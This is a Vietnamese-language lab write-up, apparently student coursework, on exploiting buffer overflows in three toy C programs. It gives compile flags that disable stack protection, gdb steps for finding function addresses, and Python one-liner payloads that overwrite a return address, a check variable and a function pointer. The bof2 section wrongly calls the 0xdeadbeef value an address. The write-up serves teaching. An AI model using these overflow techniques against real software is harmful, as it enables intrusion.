# Lab#1: Conduct buffer overflow attack on bof1.c, bof2.c, bof3.c programs.

## bof1.c
Ở đây chúng ta có đoạn code bof1.c này: 

![Code bof1](/image/Lab1/bof1_1.png)

Ta đuợc biết là hàm gets() là một hàm nhập dữ liệu nhưng không giới hạn số lượng đầu 

> --> dễ bị overflow

#### Ở đây chúng ta có Stack Frame:

![Stack frame](/image/Lab1/bof1_2.png)

Có thể thấy rằng chúng ta có thể lợi dụng được lỗ hổng của hàm gets() để dễ dàng overflow lên phần return address của vuln() --> chuyển qua secretFunc()

#### Compile file bof1 bằng lệnh: 
`gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2`

![Compile ct](/image/Lab1/bof1_5.png)

Sau đó, vào gdb `gdb -q bof1.out` để lấy địa chỉ của secretFunc() `disas secretFunc`

![SecretFunc Address](/image/Lab1/bof1_3.png)

--> `0x0804846b` là địa chỉ của `secretFunc()`

Để gây ra overflow chúng ta sẽ có lệnh 
`echo $(python -c "print('a'*204 +'\x6b\x84\x04\x08')") | ./bof1.out` để tự động nhập vào chương trình
> với `'a'*204` --> chèn hết 204 bytes còn 4 bytes cuối chúng ta sẽ chèn địa chỉ của secretFunc (`\x6b\x84\x04\x08`) chúng ta đã lấy được.

#### Kết quả:

![Overflow success](/image/Lab1/bof1_4.png)





## bof2.c

Ở đây chúng ta có đoạn code bof2.c này:

![Code bof2](/image/Lab1/bof2_1.png)

Khác ở bof1, chúng ta sử dụng hàm fgets thay vì gets để có thể giới hạn số lượng kí tự nhập vào. 

Chẳng may là người tạo ra chương trình không biết vì sơ suất hay cố ý đã cho người dùng nhập nhập vào là 45 bytes mặc dù buf chỉ có 40

> --> dễ bị overflow

#### Ở đây chúng ta có Stack Frame:

![Stack Frame](/image/Lab1/bof2_2.png)

Cũng giống như bof1, ở đây chúng ta phải thay đổi `check` thành `0xdeadbeef` bằng cách overflow từ `buf` để ghi đè lên `check`

#### Compile file bof2 bằng lệnh: 
`gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2`

![Compile bof2](image.png)

Để gây ra overflow chúng ta sẽ có lệnh 
`echo $(python -c "print('a'*40 +'\xef\xbe\xad\xde')") | ./bof2.out` để tự động nhập vào chương trình
> với `'a'*40` --> chèn hết 40 bytes còn 4 bytes cuối chúng ta sẽ chèn địa chỉ của secretFunc (`\xef\xbe\xad\xde`) chúng ta đã lấy được.

#### Kết quả:

![Overflow Succes](/image/Lab1/bof2_4.png)




## bof3.c

Ở đây chúng ta có đoạn code bof3.c này:

![Code bof3.c](/image/Lab1/bof3_1.png)

Giống như bof2, người dùng được nhập vào 133 bytes trong khi buf chỉ có 128 bytes

> --> dễ bị overflow

#### Ở đây chúng ta có Stack Frame

![Stack Frame](/image/Lab1/bof3_2.png)

Từ đây, chúng ta có thể tiếp tục gây ra overflow để ghi đè lên pointer `*func` chỉ đến từ sup() thành shell()

#### Compile file bof3 bằng lệnh: 
`gcc -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2`

![Compile bof3](/image/Lab1/bof3_3.png)

Sau đó, vào gdb `gdb -q bof3.out` để lấy địa chỉ của shell() `disas shell`

![ShellFunc Address](/image/Lab1/bof3_4.png)

--> `0x0804845b` là địa chỉ của `shell()` 

Để gây ra overflow chúng ta sẽ có lệnh
`echo $(python -c "print('a'*128+'\x5b\x84\x04\x08')") | ./bof3.out` để tự động nhập vào chương trình

> với `'a'*128` --> chèn hết 128 bytes còn 4 bytes cuối chúng ta sẽ chèn địa chỉ của shell() (`\x5b\x84\x04\x08`) chúng ta đã lấy được.

#### Kết quả

![Overflow Success](/image/Lab1/bof3_5.png)